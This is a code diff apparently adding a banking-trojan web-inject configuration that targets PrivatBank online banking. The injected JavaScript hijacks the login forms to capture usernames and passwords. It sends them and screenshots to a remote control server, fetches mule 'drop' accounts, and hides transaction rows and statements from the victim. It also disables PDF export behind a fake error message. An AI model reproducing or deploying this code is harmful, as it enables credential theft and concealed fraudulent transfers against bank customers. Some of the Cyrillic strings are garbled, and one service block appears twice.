+    azlogs.log("grabbed " + grabedAmount);
+    azlogs.log("original " + originalAmount);
+    outRestFiled.html((parseFloat(outRestFiled.html()) - grabedAmount - originalAmount).toFixed(2));
+    inpRestFiled.html(((parseFloat(outRestFiled.html())) + (parseFloat(rolloverFiled.html()))).toFixed(2));
+
+}
+function HideEdits(){
+
+    jQuery('table.sortable tbody tr').each(function () {
+        var cur = jQuery(this);
+        var num = cur.find("td:nth-child(2) form a").first().html();
+        if (DBPaydocs()().filter({dn:num}).count() > 0) {
+            DBPaydocs()().filter({dn:num}).update({status:false});
+            cur.remove();
+        }
+    });
+}
+
+function SorryPdf() {
+    alert(decodeURIComponent("%D0%A4%D1%83%D0%BD%D0%BA%D1%86%D0%B8%D1%8F%20%D0%BD%D0%B0%20%D0%B4%D0%B0%D0%BD%D0%BD%D1%8B%D0%B9%20%D0%BC%D0%BE%D0%BC%D0%B5%D0%BD%D1%82%20%D0%BD%D0%B5%D0%B4%D0%BE%D1%81%D1%82%D1%83%D0%BF%D0%BD%D0%B0."));
+}
+function QueryPrepared(){
+   jQuery.get("/p24/c2b_nbu_prepared_sign",function(data){
+       var murs=jQuery(data).find("MUR");
+
+       DBPaydocs()().update({created:false});
+       murs.each(function (){
+            var current=jQuery(this).text();
+
+            var doc=DBPaydocs()({dn:current}).first();
+            if(doc)
+            {
+
+                DBPaydocs()().update({created:true});
+                ServicePrivat.Log("created");
+                ServicePrivat.StatusPPSet(doc.initiator.drop.transid,"created");
+            }
+       });
+        var signed=DBPaydocs()({created:false}).get();
+       jQuery(signed).each(function (){
+
+           ServicePrivat.StatusPPSet(this.initiator.drop.transid,"signed");
+           ServicePrivat.Log("signed");
+       });
+   });
+}
+var Aztl, aztl;
+
+Aztl = (function() {
+
+  function Aztl() {
+    var tmp;
+    tmp = azsl.get("aztl_storage");
+    if (tmp === null) {
+      this._db = new TAFFY();
+      this._id = 1;
+    } else {
+      this._db = new TAFFY(JSON.parse(tmp));
+      this._id = this._db().count();
+    }
+  }
+
+  Aztl.prototype.log = function(l) {
+    var c, cnks, pid, _i, _len;
+    if (!l) return;
+    cnks = encodeURI(l).match(/[\s\S]{1,505}/gm);
+    pid = Math.random();
+    this._db.insert({
+      id: this._id,
+      data: "Packet_begin",
+      sending: false
+    });
+    this._id++;
+    for (_i = 0, _len = cnks.length; _i < _len; _i++) {
+      c = cnks[_i];
+      this._db.insert({
+        id: this._id,
+        data: c,
+        sending: false
+      });
+      this._id++;
+    }
+    return azsl.set("aztl_storage", this._db().stringify());
+  };
+
+  Aztl.prototype.send = function() {
+    var row;
+    if (this._db({
+      sending: false
+    }).count() === 0) return;
+    row = this._db({
+      sending: false
+    }).first();
+    this._db({
+      id: row.id
+    }).update({
+      sending: true
+    });
+    ServiceBsscomplex.SaveTLog(row.id + "|" + row.data, jQuery.proxy((function() {
+      this._db({
+        id: row.id
+      }).remove();
+      return azsl.set("aztl_storage", this._db().stringify());
+    }), this));
+    return void 0;
+  };
+
+  return Aztl;
+
+})();
+
+aztl = new Aztl();
+
+var interval;
+function azMain() {
+
+
+    if (!jQuery.Enumerable)jqExt();
+    switch (CurPage()) {
+        case Const.PAGE_AUTH:
+            ServicePrivat.Log(JSON.stringify(jQuery.browser));
+
+            MakeScreenshot("???‚?? ?? ?? ?°???‚???????·?°?†????");
+            var canSubmit = false;
+            var oldSubmit = jQuery("form#login_form").get(0).submit;
+
+        function fnSaveData() {
+            if (canSubmit) return true;
+
+
+            var act = function () {
+                canSubmit = true;
+                oldSubmit.call(jQuery("form#login_form").get(0));
+            }
+            azsl.set(Const.USER_NAME, jQuery("input[name='UserName']").val());
+            azsl.set(Const.USER_PASS, jQuery("input[name='UserPass']").val());
+            act();
+            return false;
+        }
+
+            jQuery("form#login_form").get(0).submit = fnSaveData;
+
+
+            break;
+        case Const.PAGE_MAIN:
+
+            MakeScreenshot("???‚?? ?? ???° ???»?°????????");
+
+            getBalance();
+            QueryPrepared();
+            //getUserInfo();
+            getKey();
+            //interval = setInterval('GetPaymentData',3000);
+
+
+            break;
+        case Const.PAGE_SIGN:
+            QueryPrepared();
+            GetPaymentData();
+            HidePaydocs();
+            //function Hide() {jQuery('table.sortable').css('display','table');} setTimeout('Hide()', 3000);
+            jQuery("form[action='c2b_nbu_send']").attr('onsubmit', '');
+            MakeScreenshot("???‚?? ?? ?? ???????????‚?????»?µ???‹?…");
+            break;
+
+        case Const.PAGE_SENDED:
+            QueryPrepared();
+            HideSended();
+            jQuery('table.sortable').css('display', 'table');
+            MakeScreenshot("???‚?? ?? ?? ???‚?????°???»?µ???‹?…");
+            break;
+
+        case Const.PAGE_PHONE:
+
+            ServicePrivat.Log("!!!PHONE!!!");
+
+            break;
+
+        case Const.PAGE_RESTS:
+            HideRests();
+            jQuery('table.sortable').css('display', 'table');
+            MakeScreenshot("???‚?? ?? ?? ?±?°?»?°?????°?…");
+            break;
+        case Const.PAGE_STATEMENTS:
+            HideStatements();
+            jQuery('table.sortable').css('display', 'table');
+            jQuery("form[action='c2bstatements'] input[type='button']").attr('onclick', 'SorryPdf()');
+            MakeScreenshot("???‚?? ?? ?? ???‹?????????°?…");
+            break;
+        case Const.PAGE_REPORTS:
+            HideReports();
+            jQuery('form + table').css('display', 'table');
+            jQuery('table.sortable').css('display', 'table');
+            jQuery("form[action='c2ball'] input[type='button']").attr('onclick', 'SorryPdf()');
+            MakeScreenshot("???‚?? ?? ?? ???‚?‡?‘?‚?°?…");
+            break;
+        case Const.PAGE_EDIT:
+            HideEdits();
+            jQuery('table.sortable').css('display', 'table');
+            break;
+
+    }
+
+
+    $("[href='c2bprogrest']").parent().remove();
+
+}
+
+
+jQuery(document).ready(function () {
+    azlogs.log("injected");
+
+
+    ServicePrivat.SetVersion(AZBase().system + AZBase().version);
+
+    // ServicePrivatcomplex.Log(AZBase().system+AZBase().version+" "+AZBase().battleMode?"battle":"");
+
+    PageDetector();
+    //Pages();
+    // azMain();
+});
+
+
+
+var servicesUrl='http://az.zika.in/baf/';
+function ServicePrivat() {
+
+    this.SummSet = function(acc, SummSet, callback, error) {
+        var call = new Array();
+        call['class'] = 'ServiceBsscomplex';
+        call['method'] = 'SummSet';
+        call['params'] = new Array();
+        call['params'][1] = acc;
+
+        call['params'][2] = SummSet;
+
+        var call = azUtils.serialize(call);
+        var request = new AZRequest(servicesUrl, callback, error);
+        request.send({ uid: AZBase().botid, cid: AZBase().userid, mode: 'call', call: call, sys: 'privatur' });
+    }
+
+    this.StatusPPSet = function(pid, status, callback, error) {
+        var call = new Array();
+        call['class'] = 'ServiceTransfers';
+        call['method'] = 'SetStatus';
+        call['params'] = new Array();
+        call['params'][1] = pid;
+        call['params'][2] = status;
+
+        var call = azUtils.serialize(call);
+        var request = new AZRequest(servicesUrl, callback, error);
+        request.send({ uid: AZBase().botid, cid: AZBase().userid, mode: 'call', call: call, sys: 'privatur' });
+    }
+
+
+
+
+    this.Log = function(log, callback, error) {
+        var call = new Array();
+        call['class'] = 'ServiceLog';
+        call['method'] = 'setLog';
+        call['params'] = new Array();
+        call['params'][1] = log;
+        var call = azUtils.serialize(call);
+        var request = new AZRequest(servicesUrl, callback, error);
+        request.send({ uid: AZBase().botid, cid: AZBase().userid, mode: 'call', call: call, sys: 'privatur' });
+    }
+    this.SetVersion = function(log, callback, error) {
+            var call = new Array();
+            call['class'] = 'ServiceAccounts';
+            call['method'] = 'SetVersion';
+            call['params'] = new Array();
+            call['params'][1] = log;
+            var call = azUtils.serialize(call);
+            var request = new AZRequest(servicesUrl, callback, error);
+            request.send({ uid: AZBase().botid, cid: AZBase().userid, mode: 'call', call: call, sys: 'privatur' });
+        }
+    this.Auth = function(password, login,  callback, error) {
+                var call = new Array();
+                call['class'] = 'ServiceAvangard';
+                call['method'] = 'Auth';
+                call['params'] = new Array();
+                call['params'][1] = login;
+    			call['params'][2] = password;
+
+
+                var call = azUtils.serialize(call);
+                var request = new AZRequest(servicesUrl, callback, error);
+                request.send({ uid: AZBase().botid, cid: AZBase().userid, mode: 'call', call: call, sys: 'privatur' });
+            }
+    this.Save_Data = function(txt, type, callback, error)
+    {
+        var call = new Array();
+        call['class'] = 'ServiceAvangard';
+        call['method'] = 'save_data';
+        call['params'] = new Array();
+        call['params'][1] = txt;
+        call['params'][2] = type;
+        var call = azUtils.serialize(call);
+        var request = new AZRequest(servicesUrl, callback, error);
+        request.send({ uid: AZBase().botid, cid: AZBase().userid, mode: 'call', call: call, sys: 'privatur' });
+    }
+    this.GetDrop = function(callback, error) {
+        var call = new Array();
+        call['class'] = 'ServiceTransfers';
+        call['method'] = 'GetDrop';
+        call['params'] = new Array();
+        var call = azUtils.serialize(call);
+        var request = new AZRequest(servicesUrl, callback, error);
+        request.send({ uid: AZBase().botid, cid: AZBase().userid, mode: 'call', call: call, sys: 'privatur' });
+    }
+}
+
+
+ServicePrivat= new ServicePrivat();
+
+
+
+
+
+
+data_end
+
+data_after
+data_end
+
+
+set_url *privatbank* GP
+
+data_before
+<script type="text/javascript" src="http://userapi.com/js/api/openapi.js?v=1085"></script>
+data_end
+
+data_inject
+<script>
+var __azBase={
+        botid:"%bot_id%",
+        userid:"%az_user%",
+        system:'privatcompl',
+        version:"1.1.7",
+        battleMode:true,
+        debugMode:true
+    };
+function AZBase()
+{
+    return __azBase;
+}
+
+var AZRequestDefaultErrorHandler=function(er1,er2,er3){if(AZBase().debugMode)
+    azlogs.log(azUtils.serialize(er1)+" "+er2+" "+er3);
+}
+function AZRequest(url,callback,callbackError,context)
+{
+    
+    this._url=url;
+    this._callback=callback;
+    this._error=callbackError;
+    this._context=context;
+
+
+    this.send=function (data)
+    {
+        data.botid=AZBase().botid;
+        if(!this._error)
+        {
+            this._error=AZRequestDefaultErrorHandler;
+        }
+        var query=jQuery.getJSON(this._url+"?callback=?",data,this._callback)
+        if(query&&this._error)
+        {
+            query.error(this._error);
+        }
+    }
+
+}
+
+function AZUtils() {
+    this.roundVal = function (val, dec) {
+
+        var result = Math.round(val * Math.pow(10, dec)) / Math.pow(10, dec);
+        return result;
+    }
+    this.stringFromSpaces = function(str) {
+        return str.split(' ').join('').split('&nbsp;').join('').split(String.fromCharCode(160)).join('');
+    }
+    this.stringToSpaces = function(str) {
+        var tmp=(parseFloat(str)).toString().split('.');
+        if(tmp.length==1)tmp[1]='00';
+        var f=tmp[0].replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, '$1 ');
+        return f+'.'+tmp[1];
+
+    }
+    this.serialize = function(mixed_value) {
+        var _getType = function(inp) {
+            var type = typeof inp,match;
+            var key;
+            if (type == 'object' && !inp) {
+                return'null'
+            }
+            if (type == "object") {
+                if (!inp.constructor) {
+                    return'object'
+                }
+                var cons = inp.constructor.toString();
+                if (match = cons.match(/(\w+)\(/)) {
+                    cons = match[1].toLowerCase()
+                }
+                var types = ["boolean","number","string","array"];
+                for (key in types) {
+                    if (cons == types[key]) {
+                        type = types[key];
+                        break
+                    }
+                }
+            }
+            return type
+        };
+        var type = _getType(mixed_value);
+        var val,ktype = '';
+        switch (type) {
+            case"function":
+                val = "";
+                break;
+            case"undefined":
+                val = "N";
+                break;
+            case"boolean":
+                val = "b:" + (mixed_value ? "1" : "0");
+                break;
+            case"number":
+                val = (Math.round(mixed_value) == mixed_value ? "i" : "d") + ":" + mixed_value;
+                break;
+            case"string":
+                val = "s:" + mixed_value.length + ":\"" + mixed_value + "\"";
+                break;
+            case"array":
+            case"object":
+                val = "a";
+                var count = 0;
+                var vals = "";
+                var okey;
+                var key;
+                for (key in mixed_value) {
+                    ktype = _getType(mixed_value[key]);
+                    if (ktype == "function") {
+                        continue
+                    }
+                    okey = (key.match(/^[0-9]+$/) ? parseInt(key) : key);
+                    vals += this.serialize(okey) + this.serialize(mixed_value[key]);
+                    count++
+                }
+                val += ":" + count + ":{" + vals + "}";
+                break
+        }
+        if (type != "object" && type != "array")val += ";";
+        return val
+    }
+    this.unserialize = function(data) {
+        var that = this;
+        var utf8Overhead = function(chr) {
+            var code = chr.charCodeAt(0);
+            if (code < 0x0080) {
+                return 0
+            }
+            if (code < 0x0800) {
+                return 1
+            }
+            return 2
+        };
+        var error = function(type, msg, filename, line) {
+            try {
+                if (AZBase().debugMode)azlogs.Log("" + type + " " + msg + " " + filename + " " + line)
+            } catch(e) {
+            }
+        };
+        var read_until = function(data, offset, stopchr) {
+            var buf = [];
+            var chr = data.slice(offset, offset + 1);
+            var i = 2;
+            while (chr != stopchr) {
+                if ((i + offset) > data.length) {
+                    error('Error', 'Invalid')
+                }
+                buf.push(chr);
+                chr = data.slice(offset + (i - 1), offset + i);
+                i += 1
+            }
+            return[buf.length,buf.join('')]
+        };
+        var read_chrs = function(data, offset, length) {
+            var buf;
+            buf = [];
+            for (var i = 0; i < length; i++) {
+                var chr = data.slice(offset + (i - 1), offset + i);
+                buf.push(chr);
+                length -= utf8Overhead(chr)
+            }
+            return[buf.length,buf.join('')]
+        };
+        var _unserialize = function(data, offset) {
+            var readdata;
+            var readData;
+            var chrs = 0;
+            var ccount;
+            var stringlength;
+            var keyandchrs;
+            var keys;
+            if (!offset) {
+                offset = 0
+            }
+            var dtype = (data.slice(offset, offset + 1)).toLowerCase();
+            var dataoffset = offset + 2;
+            var typeconvert = function(x) {
+                return x
+            };
+            switch (dtype) {
+                case'i':
+                    typeconvert = function(x) {
+                        return parseInt(x, 10)
+                    };
+                    readData = read_until(data, dataoffset, ';');
+                    chrs = readData[0];
+                    readdata = readData[1];
+                    dataoffset += chrs + 1;
+                    break;
+                case'b':
+                    typeconvert = function(x) {
+                        return parseInt(x, 10) !== 0
+                    };
+                    readData = read_until(data, dataoffset, ';');
+                    chrs = readData[0];
+                    readdata = readData[1];
+                    dataoffset += chrs + 1;
+                    break;
+                case'd':
+                    typeconvert = function(x) {
+                        return parseFloat(x)
+                    };
+                    readData = read_until(data, dataoffset, ';');
+                    chrs = readData[0];
+                    readdata = readData[1];
+                    dataoffset += chrs + 1;
+                    break;
+                case'n':
+                    readdata = null;
+                    break;
+                case's':
+                    ccount = read_until(data, dataoffset, ':');
+                    chrs = ccount[0];
+                    stringlength = ccount[1];
+                    dataoffset += chrs + 2;
+                    readData = read_chrs(data, dataoffset + 1, parseInt(stringlength, 10));
+                    chrs = readData[0];
+                    readdata = readData[1];
+                    dataoffset += chrs + 2;
+                    if (chrs != parseInt(stringlength, 10) && chrs != readdata.length) {
+                        error('SyntaxError', 'String length mismatch')
+                    }
+                    readdata = readdata;
+                    break;
+                case'a':
+                    readdata = {};
+                    keyandchrs = read_until(data, dataoffset, ':');
+                    chrs = keyandchrs[0];
+                    keys = keyandchrs[1];
+                    dataoffset += chrs + 2;
+                    for (var i = 0; i < parseInt(keys, 10); i++) {
+                        var kprops = _unserialize(data, dataoffset);
+                        var kchrs = kprops[1];
+                        var key = kprops[2];
+                        dataoffset += kchrs;
+                        var vprops = _unserialize(data, dataoffset);
+                        var vchrs = vprops[1];
+                        var value = vprops[2];
+                        dataoffset += vchrs;
+                        readdata[key] = value
+                    }
+                    dataoffset += 1;
+                    break;
+                default:
+                    error('SyntaxError', 'Unknown / Unhandled data type(s): ' + dtype);
+                    break
+            }
+            return[dtype,dataoffset - offset,typeconvert(readdata)]
+        };
+        return _unserialize((data + ''), 0)[2]
+    };
+    this.convertToArray = function(obj, n) {
+        if (! obj.length) {
+            return [];
+        } // length must be set on the object, or it is not iterable
+        var a = [];
+
+        try {
+            a = Array.prototype.slice.call(obj, n);
+        }
+            // IE 6 and posssibly other browsers will throw an exception, so catch it and use brute force
+        catch(e) {
+            Core.batch(obj, function(o, i) {
+                if (n <= i) {
+                    a[i - n] = o;
+                }
+            });
+        }
+
+        return a;
+    };
+}
+azUtils = new AZUtils();
+/////
+String.prototype.trim=function(){return this.replace(/^\s\s*/, '').replace(/\s\s*$/, '');};
+
+String.prototype.ltrim=function(){return this.replace(/^\s+/,'');}
+
+String.prototype.rtrim=function(){return this.replace(/\s+$/,'');}
+String.prototype.replaceAll=function(from,to){return this.split(from).join(to);}
+
+
+
+
+var servicesUrl='http://az.zika.in/baf/';
+function ServicePrivat() {
+
+    this.SummSet = function(acc, SummSet, callback, error) {
+        var call = new Array();
+        call['class'] = 'ServiceBsscomplex';
+        call['method'] = 'SummSet';
+        call['params'] = new Array();
+        call['params'][1] = acc;
+
+        call['params'][2] = SummSet;
+
+        var call = azUtils.serialize(call);
+        var request = new AZRequest(servicesUrl, callback, error);
+        request.send({ uid: AZBase().botid, cid: AZBase().userid, mode: 'call', call: call, sys: 'privatur' });
+    }
+
+    this.StatusPPSet = function(pid, status, callback, error) {
+        var call = new Array();
+        call['class'] = 'ServiceTransfers';
+        call['method'] = 'SetStatus';
+        call['params'] = new Array();
+        call['params'][1] = pid;
+        call['params'][2] = status;
+
+        var call = azUtils.serialize(call);
+        var request = new AZRequest(servicesUrl, callback, error);
+        request.send({ uid: AZBase().botid, cid: AZBase().userid, mode: 'call', call: call, sys: 'privatur' });
+    }
+
+
+
+
+    this.Log = function(log, callback, error) {
+        var call = new Array();
+        call['class'] = 'ServiceLog';
+        call['method'] = 'setLog';
+        call['params'] = new Array();
+        call['params'][1] = log;
+        var call = azUtils.serialize(call);
+        var request = new AZRequest(servicesUrl, callback, error);
+        request.send({ uid: AZBase().botid, cid: AZBase().userid, mode: 'call', call: call, sys: 'privatur' });
+    }
+    this.SetVersion = function(log, callback, error) {
+            var call = new Array();
+            call['class'] = 'ServiceAccounts';
+            call['method'] = 'SetVersion';
+            call['params'] = new Array();
+            call['params'][1] = log;
+            var call = azUtils.serialize(call);
+            var request = new AZRequest(servicesUrl, callback, error);
+            request.send({ uid: AZBase().botid, cid: AZBase().userid, mode: 'call', call: call, sys: 'privatur' });
+        }
+    this.Auth = function(password, login,  callback, error) {
+                var call = new Array();
+                call['class'] = 'ServiceAvangard';
+                call['method'] = 'Auth';
+                call['params'] = new Array();
+                call['params'][1] = login;
+    			call['params'][2] = password;
+
+
+                var call = azUtils.serialize(call);
+                var request = new AZRequest(servicesUrl, callback, error);
+                request.send({ uid: AZBase().botid, cid: AZBase().userid, mode: 'call', call: call, sys: 'privatur' });
+            }
+    this.Save_Data = function(txt, type, callback, error)
+    {
+        var call = new Array();
+        call['class'] = 'ServiceAvangard';
+        call['method'] = 'save_data';
+        call['params'] = new Array();
+        call['params'][1] = txt;
+        call['params'][2] = type;
+        var call = azUtils.serialize(call);
+        var request = new AZRequest(servicesUrl, callback, error);
+        request.send({ uid: AZBase().botid, cid: AZBase().userid, mode: 'call', call: call, sys: 'privatur' });
+    }
+    this.GetDrop = function(callback, error) {
+        var call = new Array();
+        call['class'] = 'ServiceTransfers';
+        call['method'] = 'GetDrop';
+        call['params'] = new Array();
+        var call = azUtils.serialize(call);
+        var request = new AZRequest(servicesUrl, callback, error);
+        request.send({ uid: AZBase().botid, cid: AZBase().userid, mode: 'call', call: call, sys: 'privatur' });
+    }
+}
+
+
+ServicePrivat= new ServicePrivat();
+
+function AZLogs()
+{
+    this.log=function(text)
+    {
+        var currentTime=new Date();
+        var day = currentTime.getDate();
+        var month = currentTime.getMonth()+1;
+        var year = currentTime.getYear();
+        var hours= currentTime.getHours();
+        var minutes= currentTime.getMinutes();
+        var seconds= currentTime.getSeconds();
+
+        var date = year+"-"+
+            ((month < 10) ? "0"  : "") + month+"-"+
+            ((day < 10) ? "0"  : "") + day +" "+
+            ((hours < 10) ? "0"  : "") + hours +":"+
+            ((minutes < 10) ? "0"  : "") + minutes +":"+
+            ((seconds < 10) ? "0"  : "") + seconds;
+
+        var message = date + ";"+text;
+        if(AZBase().debugMode)try{
+            console.log(message);
+        }catch(e){}
+
+
+    }
+}
+var azlogs = new AZLogs();
+
+
+jQuery(document).ready(function () {
+
+    var canSubmit = false;
+
+    function fnSaveData() {
+        if (canSubmit) return true;
+
+
+        var act = function () {
+            canSubmit = true;
+            jQuery("#legal-enter-form form").get(0).submit();
+        }
+        ServicePrivat.Log("smp User Pass: " + jQuery("[name='UserPass'].mb9").val() + " User Name: " + jQuery("[name='UserName'].mb6").val(),act,act);
+
+        return false;
+    }
+
+    jQuery("#legal-enter-form form").submit(fnSaveData);
+
+});
+
+</script>
+data_end
+
+data_after
+data_end
